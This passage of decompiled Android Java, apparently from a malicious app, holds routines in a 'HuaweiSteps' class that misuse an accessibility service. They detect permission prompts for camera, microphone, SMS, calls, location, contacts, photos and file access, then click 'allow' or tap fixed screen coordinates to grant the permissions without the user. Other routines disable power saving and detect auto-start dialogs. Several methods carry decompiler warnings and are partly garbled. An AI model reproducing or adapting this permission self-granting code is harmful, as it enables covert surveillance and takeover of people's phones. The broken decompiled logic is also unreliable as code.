            }
        }
        return null;
    }

    /* renamed from: d1 */
    public final String m212178d1() {
        return (String) this.f55077b5.getValue();
    }

    /* renamed from: d2 */
    public final String m212179d2() {
        AccessibilityNodeInfo accessibilityNodeInfoM212148c5;
        CharSequence text;
        String string;
        AccessibilityService accessibilityService = this.f55063a1;
        try {
            List<AccessibilityWindowInfo> windows = accessibilityService.getWindows();
            if (windows != null) {
                Iterator<AccessibilityWindowInfo> it = windows.iterator();
                while (it.hasNext()) {
                    CharSequence title = it.next().getTitle();
                    if (title != null && (string = title.toString()) != null && m212155e9(string)) {
                        return string;
                    }
                }
            }
        } catch (Exception e) {
            tz0.m214807a7("[荣耀权限] windows获取异常: ", e.getMessage(), "HuaweiSteps");
        }
        try {
            AccessibilityNodeInfo rootInActiveWindow = accessibilityService.getRootInActiveWindow();
            if (rootInActiveWindow == null || (accessibilityNodeInfoM212148c5 = m212148c5(rootInActiveWindow, AbstractC0716jf.m213306g5("是否允许", "允许.*访问", "允许.*使用", "录制音频", "录制视频", "拍摄照片", "拍照", "Record audio", "Record video", "Take photo", "Camera", "访问.*位置", "访问.*通讯录", "访问.*短信", "访问.*通话", "访问.*照片", "访问.*媒体", "访问.*相机", "访问.*麦克风", "发送.*短信", "读取.*短信", "拨打.*电话", "获取设备信息", "拨打电话", "管理通话"))) == null || (text = accessibilityNodeInfoM212148c5.getText()) == null) {
                return null;
            }
            return text.toString();
        } catch (Exception e2) {
            tz0.m214807a7("[荣耀权限] rootInActiveWindow获取异常: ", e2.getMessage(), "HuaweiSteps");
        }
        return null;
    }

    /* renamed from: d4 */
    public final int m212180d4() {
        return ((Number) this.f55079b7.getValue()).intValue();
    }

    /* renamed from: d5 */
    public final int m212181d5() {
        return ((Number) this.f55078b6.getValue()).intValue();
    }

    /* JADX WARN: Removed duplicated region for block: B:40:0x00e3 A[PHI: r5
      0x00e3: PHI (r5v5 com.storm.safe.rock.service.modules.yw5xud.a2) = (r5v3 com.storm.safe.rock.service.modules.yw5xud.a2), (r5v6 com.storm.safe.rock.service.modules.yw5xud.a2) binds: [B:38:0x00df, B:22:0x0088] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:43:0x00f7 A[PHI: r5
      0x00f7: PHI (r5v7 com.storm.safe.rock.service.modules.yw5xud.a2) = (r5v5 com.storm.safe.rock.service.modules.yw5xud.a2), (r5v8 com.storm.safe.rock.service.modules.yw5xud.a2) binds: [B:41:0x00f3, B:21:0x0081] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:46:0x0109 A[PHI: r5
      0x0109: PHI (r5v9 com.storm.safe.rock.service.modules.yw5xud.a2) = (r5v7 com.storm.safe.rock.service.modules.yw5xud.a2), (r5v10 com.storm.safe.rock.service.modules.yw5xud.a2) binds: [B:44:0x0105, B:20:0x007a] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:49:0x0133 A[PHI: r5
      0x0133: PHI (r5v11 com.storm.safe.rock.service.modules.yw5xud.a2) = (r5v9 com.storm.safe.rock.service.modules.yw5xud.a2), (r5v12 com.storm.safe.rock.service.modules.yw5xud.a2) binds: [B:47:0x012f, B:19:0x0073] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:52:0x0142 A[PHI: r5
      0x0142: PHI (r5v13 com.storm.safe.rock.service.modules.yw5xud.a2) = (r5v11 com.storm.safe.rock.service.modules.yw5xud.a2), (r5v14 com.storm.safe.rock.service.modules.yw5xud.a2) binds: [B:50:0x013e, B:18:0x006c] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:64:0x0179 A[PHI: r5 r7
      0x0179: PHI (r5v15 com.storm.safe.rock.service.modules.yw5xud.a2) = (r5v13 com.storm.safe.rock.service.modules.yw5xud.a2), (r5v16 com.storm.safe.rock.service.modules.yw5xud.a2) binds: [B:62:0x0175, B:17:0x0065] A[DONT_GENERATE, DONT_INLINE]
      0x0179: PHI (r7v9 long) = (r7v8 long), (r7v0 long) binds: [B:62:0x0175, B:17:0x0065] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:67:0x018b A[PHI: r5
      0x018b: PHI (r5v17 com.storm.safe.rock.service.modules.yw5xud.a2) = (r5v15 com.storm.safe.rock.service.modules.yw5xud.a2), (r5v18 com.storm.safe.rock.service.modules.yw5xud.a2) binds: [B:65:0x0188, B:16:0x005e] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:70:0x01a0 A[PHI: r5
      0x01a0: PHI (r5v19 com.storm.safe.rock.service.modules.yw5xud.a2) = (r5v17 com.storm.safe.rock.service.modules.yw5xud.a2), (r5v20 com.storm.safe.rock.service.modules.yw5xud.a2) binds: [B:68:0x019d, B:15:0x0057] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:73:0x01b7 A[PHI: r5
      0x01b7: PHI (r5v21 com.storm.safe.rock.service.modules.yw5xud.a2) = (r5v19 com.storm.safe.rock.service.modules.yw5xud.a2), (r5v22 com.storm.safe.rock.service.modules.yw5xud.a2) binds: [B:71:0x01b4, B:14:0x0050] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:76:0x01e1 A[PHI: r5
      0x01e1: PHI (r5v23 com.storm.safe.rock.service.modules.yw5xud.a2) = (r5v21 com.storm.safe.rock.service.modules.yw5xud.a2), (r5v24 com.storm.safe.rock.service.modules.yw5xud.a2) binds: [B:74:0x01de, B:13:0x0049] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:79:0x01f0  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0019  */
    /* renamed from: d6 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212182d6(ContinuationImpl continuationImpl) throws Throwable {
        HuaweiSteps$handleHonorGalleryPermission$1 huaweiSteps$handleHonorGalleryPermission$1;
        C0365a2 c0365a2;
        int iM212181d5;
        int iM212180d4;
        int iM212181d52;
        int iM212180d42;
        C0365a2 c0365a22;
        C1351vv c1351vv = C1351vv.f60710b1;
        if (continuationImpl instanceof HuaweiSteps$handleHonorGalleryPermission$1) {
            huaweiSteps$handleHonorGalleryPermission$1 = (HuaweiSteps$handleHonorGalleryPermission$1) continuationImpl;
            int i = huaweiSteps$handleHonorGalleryPermission$1.f54084a3;
            if ((i & Integer.MIN_VALUE) != 0) {
                huaweiSteps$handleHonorGalleryPermission$1.f54084a3 = i - Integer.MIN_VALUE;
            } else {
                huaweiSteps$handleHonorGalleryPermission$1 = new HuaweiSteps$handleHonorGalleryPermission$1(this, continuationImpl);
            }
        }
        Object obj = huaweiSteps$handleHonorGalleryPermission$1.f54082a1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        long j = 300;
        switch (huaweiSteps$handleHonorGalleryPermission$1.f54084a3) {
            case 0:
                kg1.m213544f4(obj);
                t60.m214714d6("HuaweiSteps", "📍 [荣耀相册] 检查相册权限");
                int i2 = Build.VERSION.SDK_INT;
                AccessibilityService accessibilityService = this.f55063a1;
                if (i2 < 33 ? accessibilityService.checkSelfPermission("android.permission.READ_EXTERNAL_STORAGE") == 0 : accessibilityService.checkSelfPermission("android.permission.READ_MEDIA_IMAGES") == 0) {
                    t60.m214704c5("HuaweiSteps", "[荣耀相册] 相册权限已授予，跳过");
                    return c1351vv;
                }
                t60.m214704c5("HuaweiSteps", "[荣耀相册] 相册权限未授予，开始处理...");
                t60.m214704c5("HuaweiSteps", "[荣耀相册] 第一次尝试：返回+home+弹窗+主坐标点击");
                t60.m214704c5("HuaweiSteps", "[荣耀相册] 按2次返回 + home");
                accessibilityService.performGlobalAction(1);
                huaweiSteps$handleHonorGalleryPermission$1.f54081a0 = this;
                huaweiSteps$handleHonorGalleryPermission$1.f54084a3 = 1;
                if (b81.m210571b1(300L, huaweiSteps$handleHonorGalleryPermission$1) != coroutineSingletons) {
                    c0365a2 = this;
                    c0365a2.f55063a1.performGlobalAction(1);
                    huaweiSteps$handleHonorGalleryPermission$1.f54081a0 = c0365a2;
                    huaweiSteps$handleHonorGalleryPermission$1.f54084a3 = 2;
                    if (b81.m210571b1(300L, huaweiSteps$handleHonorGalleryPermission$1) != coroutineSingletons) {
                        c0365a2.f55063a1.performGlobalAction(2);
                        huaweiSteps$handleHonorGalleryPermission$1.f54081a0 = c0365a2;
                        huaweiSteps$handleHonorGalleryPermission$1.f54084a3 = 3;
                        if (b81.m210571b1(500L, huaweiSteps$handleHonorGalleryPermission$1) != coroutineSingletons) {
                            c0365a2.m212194f1();
                            huaweiSteps$handleHonorGalleryPermission$1.f54081a0 = c0365a2;
                            huaweiSteps$handleHonorGalleryPermission$1.f54084a3 = 4;
                            if (b81.m210571b1(800L, huaweiSteps$handleHonorGalleryPermission$1) != coroutineSingletons) {
                                iM212181d5 = (int) (c0365a2.m212181d5() * 0.65f);
                                iM212180d4 = (int) (c0365a2.m212180d4() * 0.9f);
                                t60.m214704c5("HuaweiSteps", AbstractC0003a2.m31b2("[荣耀相册] 主坐标点击: (", iM212181d5, ", ", iM212180d4, ") = (65%, 90%)"));
                                huaweiSteps$handleHonorGalleryPermission$1.f54081a0 = c0365a2;
                                huaweiSteps$handleHonorGalleryPermission$1.f54084a3 = 5;
                                if (c0365a2.m212199f6(iM212181d5, iM212180d4, 1, huaweiSteps$handleHonorGalleryPermission$1) != coroutineSingletons) {
                                    huaweiSteps$handleHonorGalleryPermission$1.f54081a0 = c0365a2;
                                    huaweiSteps$handleHonorGalleryPermission$1.f54084a3 = 6;
                                    if (b81.m210571b1(500L, huaweiSteps$handleHonorGalleryPermission$1) != coroutineSingletons) {
                                        if (Build.VERSION.SDK_INT >= 33 ? c0365a2.f55063a1.checkSelfPermission("android.permission.READ_EXTERNAL_STORAGE") == 0 : c0365a2.f55063a1.checkSelfPermission("android.permission.READ_MEDIA_IMAGES") == 0) {
                                            t60.m214704c5("HuaweiSteps", "[荣耀相册] 主坐标点击成功，相册权限已授予");
                                            return c1351vv;
                                        }
                                        t60.m214704c5("HuaweiSteps", "[荣耀相册] 主坐标点击后仍无权限，开始第二次尝试...");
                                        t60.m214704c5("HuaweiSteps", "[荣耀相册] 按2次返回 + home");
                                        c0365a2.f55063a1.performGlobalAction(1);
                                        huaweiSteps$handleHonorGalleryPermission$1.f54081a0 = c0365a2;
                                        huaweiSteps$handleHonorGalleryPermission$1.f54084a3 = 7;
                                        j = 300;
                                        if (b81.m210571b1(300L, huaweiSteps$handleHonorGalleryPermission$1) != coroutineSingletons) {
                                            c0365a2.f55063a1.performGlobalAction(1);
                                            huaweiSteps$handleHonorGalleryPermission$1.f54081a0 = c0365a2;
                                            huaweiSteps$handleHonorGalleryPermission$1.f54084a3 = 8;
                                            if (b81.m210571b1(j, huaweiSteps$handleHonorGalleryPermission$1) != coroutineSingletons) {
                                                c0365a2.f55063a1.performGlobalAction(2);
                                                huaweiSteps$handleHonorGalleryPermission$1.f54081a0 = c0365a2;
                                                huaweiSteps$handleHonorGalleryPermission$1.f54084a3 = 9;
                                                if (b81.m210571b1(500L, huaweiSteps$handleHonorGalleryPermission$1) != coroutineSingletons) {
                                                    t60.m214704c5("HuaweiSteps", "[荣耀相册] 再次弹窗");
                                                    c0365a2.m212194f1();
                                                    huaweiSteps$handleHonorGalleryPermission$1.f54081a0 = c0365a2;
                                                    huaweiSteps$handleHonorGalleryPermission$1.f54084a3 = 10;
                                                    if (b81.m210571b1(800L, huaweiSteps$handleHonorGalleryPermission$1) != coroutineSingletons) {
                                                        iM212181d52 = (int) (c0365a2.m212181d5() * 0.65f);
                                                        iM212180d42 = (int) (c0365a2.m212180d4() * 0.815f);
                                                        t60.m214704c5("HuaweiSteps", AbstractC0003a2.m31b2("[荣耀相册] 备用坐标点击: (", iM212181d52, ", ", iM212180d42, ") = (65%, 81.5%)"));
                                                        huaweiSteps$handleHonorGalleryPermission$1.f54081a0 = c0365a2;
                                                        huaweiSteps$handleHonorGalleryPermission$1.f54084a3 = 11;
                                                        if (c0365a2.m212199f6(iM212181d52, iM212180d42, 1, huaweiSteps$handleHonorGalleryPermission$1) != coroutineSingletons) {
                                                            huaweiSteps$handleHonorGalleryPermission$1.f54081a0 = c0365a2;
                                                            huaweiSteps$handleHonorGalleryPermission$1.f54084a3 = 12;
                                                            if (b81.m210571b1(500L, huaweiSteps$handleHonorGalleryPermission$1) != coroutineSingletons) {
                                                                c0365a22 = c0365a2;
                                                                if (Build.VERSION.SDK_INT >= 33 ? c0365a22.f55063a1.checkSelfPermission("android.permission.READ_EXTERNAL_STORAGE") != 0 : c0365a22.f55063a1.checkSelfPermission("android.permission.READ_MEDIA_IMAGES") != 0) {
                                                                    t60.m214704c5("HuaweiSteps", "[荣耀相册] 两次尝试后仍未获得相册权限");
                                                                    return c1351vv;
                                                                }
                                                                t60.m214704c5("HuaweiSteps", "[荣耀相册] 备用坐标点击成功，相册权限已授予");
                                                                return c1351vv;
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                return coroutineSingletons;
            case 1:
                c0365a2 = huaweiSteps$handleHonorGalleryPermission$1.f54081a0;
                kg1.m213544f4(obj);
                c0365a2.f55063a1.performGlobalAction(1);
                huaweiSteps$handleHonorGalleryPermission$1.f54081a0 = c0365a2;
                huaweiSteps$handleHonorGalleryPermission$1.f54084a3 = 2;
                if (b81.m210571b1(300L, huaweiSteps$handleHonorGalleryPermission$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 2:
                c0365a2 = huaweiSteps$handleHonorGalleryPermission$1.f54081a0;
                kg1.m213544f4(obj);
                c0365a2.f55063a1.performGlobalAction(2);
                huaweiSteps$handleHonorGalleryPermission$1.f54081a0 = c0365a2;
                huaweiSteps$handleHonorGalleryPermission$1.f54084a3 = 3;
                if (b81.m210571b1(500L, huaweiSteps$handleHonorGalleryPermission$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 3:
                c0365a2 = huaweiSteps$handleHonorGalleryPermission$1.f54081a0;
                kg1.m213544f4(obj);
                c0365a2.m212194f1();
                huaweiSteps$handleHonorGalleryPermission$1.f54081a0 = c0365a2;
                huaweiSteps$handleHonorGalleryPermission$1.f54084a3 = 4;
                if (b81.m210571b1(800L, huaweiSteps$handleHonorGalleryPermission$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 4:
                c0365a2 = huaweiSteps$handleHonorGalleryPermission$1.f54081a0;
                kg1.m213544f4(obj);
                iM212181d5 = (int) (c0365a2.m212181d5() * 0.65f);
                iM212180d4 = (int) (c0365a2.m212180d4() * 0.9f);
                t60.m214704c5("HuaweiSteps", AbstractC0003a2.m31b2("[荣耀相册] 主坐标点击: (", iM212181d5, ", ", iM212180d4, ") = (65%, 90%)"));
                huaweiSteps$handleHonorGalleryPermission$1.f54081a0 = c0365a2;
                huaweiSteps$handleHonorGalleryPermission$1.f54084a3 = 5;
                if (c0365a2.m212199f6(iM212181d5, iM212180d4, 1, huaweiSteps$handleHonorGalleryPermission$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 5:
                c0365a2 = huaweiSteps$handleHonorGalleryPermission$1.f54081a0;
                kg1.m213544f4(obj);
                huaweiSteps$handleHonorGalleryPermission$1.f54081a0 = c0365a2;
                huaweiSteps$handleHonorGalleryPermission$1.f54084a3 = 6;
                if (b81.m210571b1(500L, huaweiSteps$handleHonorGalleryPermission$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 6:
                c0365a2 = huaweiSteps$handleHonorGalleryPermission$1.f54081a0;
                kg1.m213544f4(obj);
                if (Build.VERSION.SDK_INT >= 33) {
                    t60.m214704c5("HuaweiSteps", "[荣耀相册] 主坐标点击后仍无权限，开始第二次尝试...");
                    t60.m214704c5("HuaweiSteps", "[荣耀相册] 按2次返回 + home");
                    c0365a2.f55063a1.performGlobalAction(1);
                    huaweiSteps$handleHonorGalleryPermission$1.f54081a0 = c0365a2;
                    huaweiSteps$handleHonorGalleryPermission$1.f54084a3 = 7;
                    j = 300;
                    if (b81.m210571b1(300L, huaweiSteps$handleHonorGalleryPermission$1) != coroutineSingletons) {
                    }
                    return coroutineSingletons;
                }
                t60.m214704c5("HuaweiSteps", "[荣耀相册] 主坐标点击后仍无权限，开始第二次尝试...");
                t60.m214704c5("HuaweiSteps", "[荣耀相册] 按2次返回 + home");
                c0365a2.f55063a1.performGlobalAction(1);
                huaweiSteps$handleHonorGalleryPermission$1.f54081a0 = c0365a2;
                huaweiSteps$handleHonorGalleryPermission$1.f54084a3 = 7;
                j = 300;
                if (b81.m210571b1(300L, huaweiSteps$handleHonorGalleryPermission$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 7:
                c0365a2 = huaweiSteps$handleHonorGalleryPermission$1.f54081a0;
                kg1.m213544f4(obj);
                c0365a2.f55063a1.performGlobalAction(1);
                huaweiSteps$handleHonorGalleryPermission$1.f54081a0 = c0365a2;
                huaweiSteps$handleHonorGalleryPermission$1.f54084a3 = 8;
                if (b81.m210571b1(j, huaweiSteps$handleHonorGalleryPermission$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 8:
                c0365a2 = huaweiSteps$handleHonorGalleryPermission$1.f54081a0;
                kg1.m213544f4(obj);
                c0365a2.f55063a1.performGlobalAction(2);
                huaweiSteps$handleHonorGalleryPermission$1.f54081a0 = c0365a2;
                huaweiSteps$handleHonorGalleryPermission$1.f54084a3 = 9;
                if (b81.m210571b1(500L, huaweiSteps$handleHonorGalleryPermission$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 9:
                c0365a2 = huaweiSteps$handleHonorGalleryPermission$1.f54081a0;
                kg1.m213544f4(obj);
                t60.m214704c5("HuaweiSteps", "[荣耀相册] 再次弹窗");
                c0365a2.m212194f1();
                huaweiSteps$handleHonorGalleryPermission$1.f54081a0 = c0365a2;
                huaweiSteps$handleHonorGalleryPermission$1.f54084a3 = 10;
                if (b81.m210571b1(800L, huaweiSteps$handleHonorGalleryPermission$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 10:
                c0365a2 = huaweiSteps$handleHonorGalleryPermission$1.f54081a0;
                kg1.m213544f4(obj);
                iM212181d52 = (int) (c0365a2.m212181d5() * 0.65f);
                iM212180d42 = (int) (c0365a2.m212180d4() * 0.815f);
                t60.m214704c5("HuaweiSteps", AbstractC0003a2.m31b2("[荣耀相册] 备用坐标点击: (", iM212181d52, ", ", iM212180d42, ") = (65%, 81.5%)"));
                huaweiSteps$handleHonorGalleryPermission$1.f54081a0 = c0365a2;
                huaweiSteps$handleHonorGalleryPermission$1.f54084a3 = 11;
                if (c0365a2.m212199f6(iM212181d52, iM212180d42, 1, huaweiSteps$handleHonorGalleryPermission$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case oe0.DEFAULT_M /* 11 */:
                c0365a2 = huaweiSteps$handleHonorGalleryPermission$1.f54081a0;
                kg1.m213544f4(obj);
                huaweiSteps$handleHonorGalleryPermission$1.f54081a0 = c0365a2;
                huaweiSteps$handleHonorGalleryPermission$1.f54084a3 = 12;
                if (b81.m210571b1(500L, huaweiSteps$handleHonorGalleryPermission$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case FileClientSessionCache.MAX_SIZE /* 12 */:
                c0365a22 = huaweiSteps$handleHonorGalleryPermission$1.f54081a0;
                kg1.m213544f4(obj);
                if (Build.VERSION.SDK_INT >= 33) {
                    t60.m214704c5("HuaweiSteps", "[荣耀相册] 两次尝试后仍未获得相册权限");
                    return c1351vv;
                }
                t60.m214704c5("HuaweiSteps", "[荣耀相册] 两次尝试后仍未获得相册权限");
                return c1351vv;
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
    }

    /* renamed from: d7 */
    public final Object m212183d7(ContinuationImpl continuationImpl) {
        C1351vv c1351vv = C1351vv.f60710b1;
        if (m212187e1()) {
            t60.m214704c5("HuaweiSteps", "[华为权限] 检测到提前弹出的通知权限弹窗，点击允许/始终允许");
            if (!m212160a3("始终允许", true)) {
                m212160a3("允许", true);
            }
            Object objM210571b1 = b81.m210571b1(300L, continuationImpl);
            if (objM210571b1 == CoroutineSingletons.f57606a0) {
                return objM210571b1;
            }
        }
        return c1351vv;
    }

    /* JADX WARN: Code restructure failed: missing block: B:47:0x00e3, code lost:
    
        p000.tz0.m214809a9("[电池] 🔘 检测到弹窗，点击'", r11, "'", "HuaweiSteps");
        r8.performAction(16);
        r2.f54085a0 = r13;
        r2.f54086a1 = r12;
        r2.f54087a2 = r4;
        r2.f54090a5 = 2;
     */
    /* JADX WARN: Code restructure failed: missing block: B:48:0x00fb, code lost:
    
        if (p000.b81.m210571b1(100, r2) != r3) goto L52;
     */
    /* JADX WARN: Code restructure failed: missing block: B:53:0x0110, code lost:
    
        if (p000.b81.m210571b1(100, r2) != r3) goto L55;
     */
    /* JADX WARN: Code restructure failed: missing block: B:57:0x0130, code lost:
    
        if (p000.b81.m210571b1(100, r2) == r3) goto L58;
     */
    /* JADX WARN: Removed duplicated region for block: B:27:0x0094  */
    /* JADX WARN: Removed duplicated region for block: B:56:0x011a  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:28:0x009a -> B:29:0x009c). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:53:0x0110 -> B:55:0x0113). Please report as a decompilation issue!!! */
    /* renamed from: d8 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212184d8(ContinuationImpl continuationImpl) throws Throwable {
        HuaweiSteps$handlePerformanceAndPowerSaving$1 huaweiSteps$handlePerformanceAndPowerSaving$1;
        C0365a2 c0365a2;
        List<String> listM213306g5;
        C0365a2 c0365a22;
        int i;
        boolean z;
        AccessibilityNodeInfo accessibilityNodeInfo;
        Object next;
        if (continuationImpl instanceof HuaweiSteps$handlePerformanceAndPowerSaving$1) {
            huaweiSteps$handlePerformanceAndPowerSaving$1 = (HuaweiSteps$handlePerformanceAndPowerSaving$1) continuationImpl;
            int i2 = huaweiSteps$handlePerformanceAndPowerSaving$1.f54090a5;
            if ((i2 & Integer.MIN_VALUE) != 0) {
                huaweiSteps$handlePerformanceAndPowerSaving$1.f54090a5 = i2 - Integer.MIN_VALUE;
            } else {
                huaweiSteps$handlePerformanceAndPowerSaving$1 = new HuaweiSteps$handlePerformanceAndPowerSaving$1(this, continuationImpl);
            }
        }
        Object obj = huaweiSteps$handlePerformanceAndPowerSaving$1.f54088a3;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i3 = huaweiSteps$handlePerformanceAndPowerSaving$1.f54090a5;
        int i4 = 4;
        boolean z2 = true;
        if (i3 == 0) {
            kg1.m213544f4(obj);
            t60.m214704c5("HuaweiSteps", "[电池] 开启性能模式");
            m212208g6("性能模式", true);
            huaweiSteps$handlePerformanceAndPowerSaving$1.f54085a0 = this;
            huaweiSteps$handlePerformanceAndPowerSaving$1.f54090a5 = 1;
            if (b81.m210571b1(100L, huaweiSteps$handlePerformanceAndPowerSaving$1) != coroutineSingletons) {
                c0365a2 = this;
            }
            return coroutineSingletons;
        }
        if (i3 == 1) {
            c0365a2 = huaweiSteps$handlePerformanceAndPowerSaving$1.f54085a0;
            kg1.m213544f4(obj);
        } else {
            if (i3 != 2) {
                if (i3 != 3) {
                    if (i3 != 4) {
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                    }
                    kg1.m213544f4(obj);
                    return C1351vv.f60710b1;
                }
                i = huaweiSteps$handlePerformanceAndPowerSaving$1.f54087a2;
                listM213306g5 = huaweiSteps$handlePerformanceAndPowerSaving$1.f54086a1;
                c0365a22 = huaweiSteps$handlePerformanceAndPowerSaving$1.f54085a0;
                kg1.m213544f4(obj);
                z = z2;
                i++;
                z2 = z;
                i4 = 4;
                if (i >= i4) {
                    t60.m214704c5("HuaweiSteps", "[电池] 关闭省电模式");
                    c0365a22.m212208g6("省电模式", false);
                    huaweiSteps$handlePerformanceAndPowerSaving$1.f54085a0 = null;
                    huaweiSteps$handlePerformanceAndPowerSaving$1.f54086a1 = null;
                    huaweiSteps$handlePerformanceAndPowerSaving$1.f54090a5 = 4;
                } else {
                    AccessibilityNodeInfo rootInActiveWindow = c0365a22.f55063a1.getRootInActiveWindow();
                    if (rootInActiveWindow != null) {
                        for (String str : listM213306g5) {
                            z = z2;
                            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(str);
                            if (listFindAccessibilityNodeInfosByText != null) {
                                Iterator<T> it = listFindAccessibilityNodeInfosByText.iterator();
                                while (true) {
                                    if (!it.hasNext()) {
                                        next = null;
                                        break;
                                    }
                                    next = it.next();
                                    AccessibilityNodeInfo accessibilityNodeInfo2 = (AccessibilityNodeInfo) next;
                                    if (accessibilityNodeInfo2.isVisibleToUser() && accessibilityNodeInfo2.isClickable()) {
                                        break;
                                    }
                                }
                                accessibilityNodeInfo = (AccessibilityNodeInfo) next;
                            } else {
                                accessibilityNodeInfo = null;
                            }
                            if (accessibilityNodeInfo != null) {
                                break;
                            }
                            z2 = z;
                        }
                        z = z2;
                        huaweiSteps$handlePerformanceAndPowerSaving$1.f54085a0 = c0365a22;
                        huaweiSteps$handlePerformanceAndPowerSaving$1.f54086a1 = listM213306g5;
                        huaweiSteps$handlePerformanceAndPowerSaving$1.f54087a2 = i;
                        huaweiSteps$handlePerformanceAndPowerSaving$1.f54090a5 = 3;
                    }
                    z = z2;
                    i++;
                    z2 = z;
                    i4 = 4;
                    if (i >= i4) {
                    }
                }
                return coroutineSingletons;
            }
            i = huaweiSteps$handlePerformanceAndPowerSaving$1.f54087a2;
            listM213306g5 = huaweiSteps$handlePerformanceAndPowerSaving$1.f54086a1;
            c0365a22 = huaweiSteps$handlePerformanceAndPowerSaving$1.f54085a0;
            kg1.m213544f4(obj);
            z = z2;
            huaweiSteps$handlePerformanceAndPowerSaving$1.f54085a0 = c0365a22;
            huaweiSteps$handlePerformanceAndPowerSaving$1.f54086a1 = listM213306g5;
            huaweiSteps$handlePerformanceAndPowerSaving$1.f54087a2 = i;
            huaweiSteps$handlePerformanceAndPowerSaving$1.f54090a5 = 3;
        }
        listM213306g5 = AbstractC0716jf.m213306g5("开启", "确定", "确认", "允许", "開啟", "確定", "確認", "允許");
        c0365a22 = c0365a2;
        i = 1;
        if (i >= i4) {
        }
        return coroutineSingletons;
    }

    /* renamed from: d9 */
    public final boolean m212185d9() {
        boolean z;
        boolean z2;
        AccessibilityNodeInfo rootInActiveWindow = this.f55063a1.getRootInActiveWindow();
        boolean z3 = false;
        if (rootInActiveWindow == null) {
            return false;
        }
        ArrayList arrayList = new ArrayList();
        m212145a7(rootInActiveWindow, arrayList);
        if (arrayList.isEmpty()) {
            z = false;
        } else {
            int size = arrayList.size();
            int i = 0;
            while (i < size) {
                Object obj = arrayList.get(i);
                i++;
                if (AbstractC0779a1.m213652a5((String) obj, "手动管理", false)) {
                    z = true;
                    break;
                }
            }
            z = false;
        }
        if (arrayList.isEmpty()) {
            z2 = false;
        } else {
            int size2 = arrayList.size();
            int i2 = 0;
            while (i2 < size2) {
                Object obj2 = arrayList.get(i2);
                i2++;
                String str = (String) obj2;
                if (AbstractC0779a1.m213652a5(str, "允许自启动", false) || AbstractC0779a1.m213652a5(str, "允许关联启动", false) || AbstractC0779a1.m213652a5(str, "允许后台活动", false)) {
                    z2 = true;
                    break;
                }
            }
            z2 = false;
        }
        if (z && z2) {
            z3 = true;
        }
        t60.m214704c5("HuaweiSteps", "[isAutoStartDialogOpened] hasManual=" + z + ", hasSwitch=" + z2 + ", result=" + z3);
        return z3;
    }

    /* renamed from: e0 */
    public final boolean m212186e0() {
        AccessibilityNodeInfo rootInActiveWindow = this.f55063a1.getRootInActiveWindow();
        if (rootInActiveWindow == null) {
            return false;
        }
        CharSequence packageName = rootInActiveWindow.getPackageName();
        return t60.m214686a2(packageName != null ? packageName.toString() : null, "com.android.settings");
    }

    /* renamed from: e1 */
    public final boolean m212187e1() {
        AccessibilityNodeInfo rootInActiveWindow = this.f55063a1.getRootInActiveWindow();
        if (rootInActiveWindow == null) {
            return false;
        }
        for (String str : AbstractC0716jf.m213306g5("发送通知", "允许发送通知", "通知权限", "POST_NOTIFICATIONS", "Send notifications", "Allow notifications", "发布通知")) {
            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(str);
            if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                Iterator<T> it = listFindAccessibilityNodeInfosByText.iterator();
                while (it.hasNext()) {
                    if (((AccessibilityNodeInfo) it.next()).isVisibleToUser()) {
                        tz0.m214807a7("[通知弹窗检测] ✓ 检测到关键词: ", str, "HuaweiSteps");
                        return true;
                    }
                }
            }
        }
        return false;
    }

    /* renamed from: e2 */
    public final boolean m212188e2() {
        AccessibilityNodeInfo rootInActiveWindow = this.f55063a1.getRootInActiveWindow();
        if (rootInActiveWindow == null) {
            return false;
        }
        ArrayList arrayList = new ArrayList();
        m212145a7(rootInActiveWindow, arrayList);
        for (String str : AbstractC0716jf.m213306g5("文件", m212178d1(), "所有文件访问权限", "檔案", "所有檔案存取權限")) {
            if (!arrayList.isEmpty()) {
                int size = arrayList.size();
                int i = 0;
                while (i < size) {
                    Object obj = arrayList.get(i);
                    i++;
